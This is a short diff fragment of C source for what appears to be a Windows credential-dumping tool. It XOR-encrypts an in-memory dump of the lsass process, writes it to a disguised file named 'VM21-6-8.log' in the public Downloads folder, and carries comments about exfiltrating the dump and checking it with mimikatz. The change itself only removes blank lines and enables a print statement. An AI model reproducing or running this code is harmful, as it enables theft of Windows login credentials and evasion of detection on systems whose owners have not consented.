@@ -140,15 +140,13 @@ int main(int argc, char* argv[]) {
 
 		securitySth = Xorcrypt(securitySth, bytesRead, key);
 
-
-
 		// At this point, we have the lsass dump in memory at location dumpBuffer - we can do whatever we want with that buffer, i.e encrypt & exfiltrate
 		HANDLE outFile = CreateFile(L"C:\\Users\\Public\\Downloads\\VM21-6-8.log", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
 		//// For testing purposes, let's write lsass dump to disk from our own dumpBuffer and check if mimikatz can work it
 		if (WriteFile(outFile, securitySth, bytesRead, &bytesWritten, NULL))
 		{
-			//printf("\n[+] to C:\\Users\\Public\\Downloads\\VM21-6-8.log\n");
+			printf("\n[+] to C:\\Users\\Public\\Downloads\\VM21-6-8.log\n");
 		}
 
 		CloseHandle(outFile);
